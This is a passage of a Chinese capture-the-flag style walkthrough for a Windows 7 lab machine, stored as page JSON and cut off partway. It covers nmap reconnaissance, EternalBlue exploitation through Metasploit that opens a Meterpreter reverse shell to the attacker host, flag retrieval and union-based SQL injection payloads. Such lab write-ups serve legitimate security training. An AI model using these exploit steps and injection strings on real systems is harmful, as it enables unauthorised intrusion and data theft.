{"pageProps":{"postData":{"id":"Vulnhubwin7-attack","contentHtml":"<h1>win7-attack</h1>\n<blockquote>\n<p>by gongli</p>\n</blockquote>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>161</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-20 10:59 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00026</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:BD:<span class=\"hljs-number\">3</span>E:<span class=\"hljs-number\">47</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00025</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:E1:D9:<span class=\"hljs-number\">7</span>D (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-20 11:01 CST</span>\nWarning: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span> giving up on port because retransmission cap <span class=\"hljs-title function_ invoke__\">hit</span> (<span class=\"hljs-number\">10</span>).\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00072</span>s latency).\nNot shown: <span class=\"hljs-number\">64615</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused), <span class=\"hljs-number\">907</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp    open  http\n<span class=\"hljs-number\">135</span>/tcp   open  msrpc\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds\n<span class=\"hljs-number\">3306</span>/tcp  open  mysql\n<span class=\"hljs-number\">3389</span>/tcp  open  ms-wbt-server\n<span class=\"hljs-number\">5357</span>/tcp  open  wsdapi\n<span class=\"hljs-number\">49152</span>/tcp open  unknown\n<span class=\"hljs-number\">49153</span>/tcp open  unknown\n<span class=\"hljs-number\">49154</span>/tcp open  unknown\n<span class=\"hljs-number\">49155</span>/tcp open  unknown\n<span class=\"hljs-number\">49156</span>/tcp open  unknown\n<span class=\"hljs-number\">49157</span>/tcp open  unknown\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:BD:<span class=\"hljs-number\">3</span>E:<span class=\"hljs-number\">47</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p80,<span class=\"hljs-number\">3306</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">5357</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>\n<span class=\"hljs-comment\">//</span>\nPORT     STATE SERVICE        VERSION\n<span class=\"hljs-number\">80</span>/tcp   open  http           Microsoft IIS httpd <span class=\"hljs-number\">7.5</span>\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc          Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp  open  microsoft-ds   Microsoft Windows <span class=\"hljs-number\">7</span> - <span class=\"hljs-number\">10</span> microsoft-<span class=\"hljs-title function_ invoke__\">ds</span> (<span class=\"hljs-attr\">workgroup</span>: WORKGROUP)\n<span class=\"hljs-number\">3306</span>/tcp open  mysql          MySQL <span class=\"hljs-number\">5.5</span>.<span class=\"hljs-number\">11</span>\n<span class=\"hljs-number\">3389</span>/tcp open  ms-wbt-server?\n<span class=\"hljs-number\">5357</span>/tcp open  http           Microsoft HTTPAPI httpd <span class=\"hljs-number\">2.0</span> (SSDP/UPnP)\n<span class=\"hljs-number\">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:<span class=\"hljs-comment\">//nmap.org/cgi-bin/submit.cgi?new-service :</span>\nSF-Port3389-TCP:V=<span class=\"hljs-number\">7.94</span>SVN%I=<span class=\"hljs-number\">7</span>%D=<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">20</span>%Time=<span class=\"hljs-number\">67147317</span>%P=x86_64-pc-linux-gnu%\nSF:<span class=\"hljs-title function_ invoke__\">r</span>(TerminalServerCookie,<span class=\"hljs-number\">13</span>,<span class=\"hljs-string\">\"\\x03\\0\\0\\x13\\x0e\\xd0\\0\\0\\x124\\0\\x02\\x01\\x08\\\nSF:0\\x02\\0\\0\\0\"</span>);\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:BD:<span class=\"hljs-number\">3</span>E:<span class=\"hljs-number\">47</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Microsoft Windows <span class=\"hljs-number\">7</span>|<span class=\"hljs-number\">2008</span>|<span class=\"hljs-number\">8.1</span>\nOS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::<span class=\"hljs-variable constant_\">sp1</span> cpe:/o:microsoft:windows_server_2008::<span class=\"hljs-variable constant_\">sp1</span> cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.<span class=\"hljs-number\">1</span>\nOS details: Microsoft Windows <span class=\"hljs-number\">7</span> SP0 - SP1, Windows Server <span class=\"hljs-number\">2008</span> SP1, Windows Server <span class=\"hljs-number\">2008</span> R2, Windows <span class=\"hljs-number\">8</span>, <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">8.1</span> Update <span class=\"hljs-number\">1</span>\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-c\">nmap -script=vuln -p80,<span class=\"hljs-number\">3306</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">5357</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-20 11:05 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>\nHost is up (<span class=\"hljs-number\">0.00040</span>s latency).\n\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp   open  http\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-enum: \n|   /robots.txt: Robots file\n|_  /data/: Potentially interesting folder\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3306/tcp open  mysql\n|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)\n3389/tcp open  ms-wbt-server\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n5357/tcp open  wsdapi\nMAC Address: 00:0C:29:BD:3E:47 (VMware)\n\nHost script results:\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-054: false\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n\n</span></code></pre>\n</li>\n<li>\n<p>一波操作，web服务器是<code>IIS 7.5</code> ，mysql版本是<code>5.5.11</code> ,以及135 <code>RPC</code>，138 <code>NetBIOS</code>，445 <code>SMB</code></p>\n<p>扫描漏洞，80端口下存在两个较可疑文件夹；3306疑似发现<code>cve2012-2122</code>；还扫描到了SMB服务器的漏洞<code>CVE-2017-0143</code> 等级为<code>high</code></p>\n<p>优先级：<code>CVE-2017-0143</code> > 80 >…</p>\n</li>\n</ol>\n<h2>CVE-2017-0143</h2>\n<ol>\n<li>\n<p>永恒之蓝 MS17-010</p>\n</li>\n<li>\n<p>检测是否存在</p>\n<ul>\n<li>\n<p>使用msf进行扫描是否存在</p>\n<pre><code class=\"hljs language-c\">msf6 > search MS17<span class=\"hljs-number\">-010</span>\n\nMatching Modules\n================\n\n   #   Name                                           Disclosure Date  Rank     Check  Description\n   -   ----                                           ---------------  ----     -----  -----------\n   <span class=\"hljs-number\">0</span>   exploit/windows/smb/ms17_010_eternalblue       <span class=\"hljs-number\">2017</span><span class=\"hljs-number\">-03</span><span class=\"hljs-number\">-14</span>       average  Yes    MS17<span class=\"hljs-number\">-010</span> EternalBlue SMB Remote Windows Kernel Pool Corruption\n   <span class=\"hljs-number\">1</span>     \\_ target: Automatic Target                  .                .        .      .\n   <span class=\"hljs-number\">2</span>     \\_ target: Windows <span class=\"hljs-number\">7</span>                         .                .        .      .\n   <span class=\"hljs-number\">3</span>     \\_ target: Windows Embedded Standard <span class=\"hljs-number\">7</span>       .                .        .      .\n   <span class=\"hljs-number\">4</span>     \\_ target: Windows Server <span class=\"hljs-number\">2008</span> R2            .                .        .      .\n   <span class=\"hljs-number\">5</span>     \\_ target: Windows <span class=\"hljs-number\">8</span>                         .                .        .      .\n   <span class=\"hljs-number\">6</span>     \\_ target: Windows <span class=\"hljs-number\">8.1</span>                       .                .        .      .\n   <span class=\"hljs-number\">7</span>     \\_ target: Windows Server <span class=\"hljs-number\">2012</span>               .                .        .      .\n   <span class=\"hljs-number\">8</span>     \\_ target: Windows <span class=\"hljs-number\">10</span> Pro                    .                .        .      .\n   <span class=\"hljs-number\">9</span>     \\_ target: Windows <span class=\"hljs-number\">10</span> Enterprise Evaluation  .                .        .      .\n   <span class=\"hljs-number\">10</span>  exploit/windows/smb/ms17_010_psexec            <span class=\"hljs-number\">2017</span><span class=\"hljs-number\">-03</span><span class=\"hljs-number\">-14</span>       normal   Yes    MS17<span class=\"hljs-number\">-010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   <span class=\"hljs-number\">11</span>    \\_ target: Automatic                         .                .        .      .\n   <span class=\"hljs-number\">12</span>    \\_ target: PowerShell                        .                .        .      .\n   <span class=\"hljs-number\">13</span>    \\_ target: Native upload                     .                .        .      .\n   <span class=\"hljs-number\">14</span>    \\_ target: MOF upload                        .                .        .      .\n   <span class=\"hljs-number\">15</span>    \\_ AKA: ETERNALSYNERGY                       .                .        .      .\n   <span class=\"hljs-number\">16</span>    \\_ AKA: ETERNALROMANCE                       .                .        .      .\n   <span class=\"hljs-number\">17</span>    \\_ AKA: ETERNALCHAMPION                      .                .        .      .\n   <span class=\"hljs-number\">18</span>    \\_ AKA: ETERNALBLUE                          .                .        .      .\n   <span class=\"hljs-number\">19</span>  auxiliary/admin/smb/ms17_010_command           <span class=\"hljs-number\">2017</span><span class=\"hljs-number\">-03</span><span class=\"hljs-number\">-14</span>       normal   No     MS17<span class=\"hljs-number\">-010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   <span class=\"hljs-number\">20</span>    \\_ AKA: ETERNALSYNERGY                       .                .        .      .\n   <span class=\"hljs-number\">21</span>    \\_ AKA: ETERNALROMANCE                       .                .        .      .\n   <span class=\"hljs-number\">22</span>    \\_ AKA: ETERNALCHAMPION                      .                .        .      .\n   <span class=\"hljs-number\">23</span>    \\_ AKA: ETERNALBLUE                          .                .        .      .\n   <span class=\"hljs-number\">24</span>  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17<span class=\"hljs-number\">-010</span> SMB RCE Detection\n   <span class=\"hljs-number\">25</span>    \\_ AKA: DOUBLEPULSAR                         .                .        .      .\n   <span class=\"hljs-number\">26</span>    \\_ AKA: ETERNALBLUE                          .                .        .      .\n   <span class=\"hljs-number\">27</span>  exploit/windows/smb/smb_doublepulsar_rce       <span class=\"hljs-number\">2017</span><span class=\"hljs-number\">-04</span><span class=\"hljs-number\">-14</span>       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n   <span class=\"hljs-number\">28</span>    \\_ target: Execute payload (x64)             .                .        .      .\n   <span class=\"hljs-number\">29</span>    \\_ target: Neutralize implant                .                .        .      .\n</code></pre>\n</li>\n<li>\n<p>使用 <code>auxiliary/scanner/smb/smb_ms17_010</code> 检查漏洞是否存在</p>\n<pre><code class=\"hljs language-c\">msf6 > use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 <span class=\"hljs-title function_\">auxiliary</span><span class=\"hljs-params\">(scanner/smb/smb_ms17_010)</span> > <span class=\"hljs-built_in\">set</span> rhosts 192.168.75.162\nmsf6 <span class=\"hljs-title function_\">auxiliary</span><span class=\"hljs-params\">(scanner/smb/smb_ms17_010)</span> > ru\n[+] 192.168.75.162:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 <span class=\"hljs-title function_\">x86</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">32</span>-bit)</span>\n[*] 192.168.75.162:445    - Scanned 1 of 1 <span class=\"hljs-title function_\">hosts</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">100</span>% complete)</span>\n[*] Auxiliary module execution completed\n</code></pre>\n<p>可能易受攻击，存在漏洞</p>\n</li>\n</ul>\n</li>\n<li>\n<p>渗透执行</p>\n<ul>\n<li>\n<p>使用永恒之蓝漏洞 <code>ms17_010_eternalblue</code></p>\n<pre><code class=\"hljs language-c\">msf6 > use exploit/windows/smb/ms17_010_eternalblue \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > options\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > <span class=\"hljs-built_in\">set</span> rhosts 192.168.75.162\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > run                                                                                                         \n                                                                                                                                                             \n[*] Started reverse TCP handler on 192.168.75.151:4444                                                                                                       \n[*] 192.168.75.162:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                   \n[+] 192.168.75.162:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 <span class=\"hljs-title function_\">x86</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">32</span>-bit)</span>                                     \n[*] 192.168.75.162:445    - Scanned 1 of 1 <span class=\"hljs-title function_\">hosts</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">100</span>% complete)</span>                                                                                             \n[+] 192.168.75.162:445 - The target is vulnerable.                                                                                                           \n[-] 192.168.75.162:445 - Exploit aborted due to failure: no-target: This module only supports <span class=\"hljs-title function_\">x64</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">64</span>-bit)</span> targets                                           \n[*] Exploit completed, but no session was created.\n</code></pre>\n<p>提示 <code>Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets</code></p>\n<p>仅支持x64的模块，需要安装x32的模块</p>\n</li>\n</ul>\n</li>\n<li>\n<p>安装<code>x86</code>的模块</p>\n<ul>\n<li>\n<p>模块</p>\n<p><a href=\"https://github.com/1stPeak/Eternalblue-Doublepulsar-Metasploit-master\">https://github.com/1stPeak/Eternalblue-Doublepulsar-Metasploit-master</a></p>\n<p>kali没有32位的利用模块将下载下来的<code>Eternalblue-Doublepulsar-Metasploit-master</code>的名字改为<code>Eternalblue-Doublepulsar-Metasploit</code>并将改完名后的整个目录复制到root目录下(需要解压2次,把最后一次解压名改为Eternalblue-Doublepulsar-Metasploit 并放到/root目录下)<code>eternalblue_doublepulsar.rb</code> 拷贝到<code>/usr/share/metasploitframework/modules/exploits/windows/smb</code>目录下</p>\n</li>\n<li>\n<p>安装框架</p>\n<pre><code class=\"hljs language-c\">dpkg --add-architecture i386 &#x26;&#x26; apt-get update &#x26;&#x26; apt-get install wine32\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>执行模块</p>\n<p>获得shell</p>\n<pre><code class=\"hljs language-c\">msf6 > use exploit/windows/smb/eternalblue_doublepulsar \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/eternalblue_doublepulsar)</span> > options\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/eternalblue_doublepulsar)</span> > <span class=\"hljs-built_in\">set</span> rhosts 192.168.75.162\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/eternalblue_doublepulsar)</span> > <span class=\"hljs-built_in\">set</span> processinject explorer.exe\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/eternalblue_doublepulsar)</span> > exploit\n<span class=\"hljs-comment\">// 能成功但是反弹不了shell ， 修改processinject为lsass.exe</span>\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/eternalblue_doublepulsar)</span> > <span class=\"hljs-built_in\">set</span> processinject lsass.exe\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/eternalblue_doublepulsar)</span> > run\n\n[*] Started reverse TCP handler on 192.168.75.151:4444 \n[*] 192.168.75.162:445 - Generating Eternalblue XML data\n[*] 192.168.75.162:445 - Generating Doublepulsar XML data\n[*] 192.168.75.162:445 - Generating payload DLL <span class=\"hljs-keyword\">for</span> Doublepulsar\n[*] 192.168.75.162:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll\n[*] 192.168.75.162:445 - Launching Eternalblue...\n[+] 192.168.75.162:445 - Backdoor is already installed\n[*] 192.168.75.162:445 - Launching Doublepulsar...\n[*] Sending <span class=\"hljs-title function_\">stage</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">176198</span> bytes)</span> to 192.168.75.162\n[*] Meterpreter session 1 <span class=\"hljs-title function_\">opened</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>:<span class=\"hljs-number\">4444</span> -> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>:<span class=\"hljs-number\">49233</span>)</span> at 2024-10-20 14:41:13 +0800\n[+] 192.168.75.162:445 - Remote code executed... 3... 2... 1...\nmeterpreter > \n</code></pre>\n</li>\n</ol>\n<h2>flag2</h2>\n<p><code>c</code>盘根目录下存在<code>flag2.txt</code></p>\n<pre><code class=\"hljs language-c\">C:\\Windows\\system32>ipconfig\nipconfig\n\nWindows IP ����\n\n���������� ��������:\n\n   �����ض��� DNS ��׺ . . . . . . . : localdomain\n   �������� IPv6 ��. . . . . . . . : fe80::ed56:<span class=\"hljs-number\">10</span>a0:d8a7:f304%<span class=\"hljs-number\">11</span>\n   IPv4 �� . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.162</span>\n   ��������  . . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span>\n   Ĭ������. . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\n\n���������� isatap.localdomain:\n\n   ý��״  . . . . . . . . . . . . : ý���ѶϿ�\n   �����ض��� DNS ��׺ . . . . . . . : localdomain\n\n���������� ��������*:\n\n   ý��״  . . . . . . . . . . . . : ý���ѶϿ�\n   �����ض��� DNS ��׺ . . . . . . . : \n<span class=\"hljs-comment\">//</span>\nC:\\Windows\\system32>Cd c:/\nCd c:/\n<span class=\"hljs-comment\">//</span>\nc:\\>dir\ndir\n ������ C �еľ�û�б�ǩ��\n �������к��� D648-E0A4\n\n c:\\ ��Ŀ¼\n\n<span class=\"hljs-number\">2017</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">38</span>    &#x3C;DIR>          Admin\n<span class=\"hljs-number\">2009</span>/<span class=\"hljs-number\">06</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">42</span>                <span class=\"hljs-number\">24</span> autoexec.bat\n<span class=\"hljs-number\">2009</span>/<span class=\"hljs-number\">06</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">42</span>                <span class=\"hljs-number\">10</span> config.sys\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">09</span>/<span class=\"hljs-number\">13</span>  <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">46</span>               <span class=\"hljs-number\">149</span> flag2.txt\n<span class=\"hljs-number\">2017</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">38</span>    &#x3C;DIR>          Home\n<span class=\"hljs-number\">2017</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">46</span>    &#x3C;DIR>          inetpub\n<span class=\"hljs-number\">2009</span>/<span class=\"hljs-number\">07</span>/<span class=\"hljs-number\">14</span>  <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">37</span>    &#x3C;DIR>          PerfLogs\n<span class=\"hljs-number\">2017</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">12</span>  <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">40</span>    &#x3C;DIR>          Program Files\n<span class=\"hljs-number\">2017</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">07</span>  <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">18</span>    &#x3C;DIR>          Python27\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">09</span>/<span class=\"hljs-number\">05</span>  <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">01</span>    &#x3C;DIR>          Users\n<span class=\"hljs-number\">2024</span>/<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">06</span>    &#x3C;DIR>          Windows\n               <span class=\"hljs-number\">3</span> ���ļ�            <span class=\"hljs-number\">183</span> ��\n               <span class=\"hljs-number\">8</span> ��Ŀ¼ <span class=\"hljs-number\">54</span>,<span class=\"hljs-number\">033</span>,<span class=\"hljs-number\">711</span>,<span class=\"hljs-number\">104</span> ������\n<span class=\"hljs-comment\">//</span>\nc:\\>type flag2.txt\ntype flag2.txt\n��ϲ��!���ǵ�<span class=\"hljs-number\">2</span>��flag,��ȥ��ʣ�µ�flag��.\nflag{ajkwncalwrli}\n\n�ɴ��۾��Ϳ����ҵ�������.\n��<span class=\"hljs-number\">3</span>��flag����Administrator�û���������\n</code></pre>\n<h2>flag3</h2>\n<p>在靶机桌面</p>\n<pre><code class=\"hljs language-c\">C:\\Users\\Administrator\\Desktop>type flag3.txt\n<span class=\"hljs-comment\">//</span>\ntype flag3.txt\nflag{cjdhrncalzos}\n\n��ϲ�ɹ���!\n</code></pre>\n<p><code>flag{ajkwncalwrli}</code> 继续寻找<code>flag1</code> ，可能在web</p>\n<h2>web渗透-1</h2>\n<ol>\n<li>\n<p>前面nmap扫描出，存在有兴趣的目录</p>\n<pre><code class=\"hljs language-c\">| http-<span class=\"hljs-class\"><span class=\"hljs-keyword\">enum</span>:</span> \n|   /robots.txt: Robots file\n|_  /data/: Potentially interesting folder\n</code></pre>\n<p>没什么有价值的东西</p>\n</li>\n<li>\n<p>经测试<code>/index.php?s=/news/1</code> 存在注入</p>\n<pre><code class=\"hljs language-c\">index.php?s=/news/<span class=\"hljs-number\">1</span>) order by <span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">23</span> <span class=\"hljs-comment\">// 闭合成功</span>\nindex.php?s=/news/<span class=\"hljs-number\">1</span>) order by <span class=\"hljs-number\">7</span>%<span class=\"hljs-number\">23</span> <span class=\"hljs-comment\">// 7个字段</span>\nindex.php?s=/news/<span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">union</span> select <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">7</span> %<span class=\"hljs-number\">23</span> **<span class=\"hljs-comment\">// 2 和 7 为显示位**</span>\nindex.php?s=/news/<span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">union</span> select <span class=\"hljs-number\">1</span>,database(),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">7</span> %<span class=\"hljs-number\">23</span>  <span class=\"hljs-comment\">// 当前数据库为 tpx</span>\nindex.php?s=/news/<span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">union</span> select <span class=\"hljs-number\">1</span>,user(),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">7</span> %<span class=\"hljs-number\">23</span>   <span class=\"hljs-comment\">// 当前用户 root</span>\n</code></pre>\n<pre><code class=\"hljs language-c\">index.php?s=/news/<span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">union</span> select <span class=\"hljs-number\">1</span>,group_concat(table_name),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">7</span> from information_schema.tables where table_schema = database() %<span class=\"hljs-number\">23</span>\n<span class=\"hljs-comment\">// 得到表</span>\n<span class=\"hljs-comment\">//  tpx_admin_access,tpx_admin_node,tpx_admin_role,tpx_admin_role_user,tpx_admin_user,tpx_cms_news,tpx_cms_partner,tpx_cms_product,tpx_cms_product_cat,tpx_cms_single_page,tpx_cms_slide,tpx_cms_tag_pool,tpx_config,tpx_data_files </span>\n<span class=\"hljs-comment\">// tpx_admin_user 是我们感兴趣的</span>\n\nindex.php?s=/news/<span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">union</span> select <span class=\"hljs-number\">1</span>,group_concat(column_name),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">7</span> from information_schema.columns where table_schema = database() and table_name=<span class=\"hljs-string\">'tpx_admin_user'</span> %<span class=\"hljs-number\">23</span>\n<span class=\"hljs-comment\">// 得到表 tpx_admin_user 的列</span>\n<span class=\"hljs-comment\">//  